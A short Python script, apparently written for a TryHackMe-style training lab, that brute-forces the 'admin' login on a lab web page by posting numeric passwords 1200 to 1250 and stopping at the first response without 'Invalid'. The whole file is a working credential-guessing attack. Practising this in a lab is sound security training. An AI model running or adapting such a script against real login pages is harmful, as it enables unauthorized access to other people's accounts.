import requests

url = "http://python.thm/labs/lab1/index.php"
username = "admin"

def brute_force():
    for i in range(1200, 1251):   # 1200 → 1250
        password = str(i)
        data = {"username": username, "password": password}

        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            print(response.text)
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
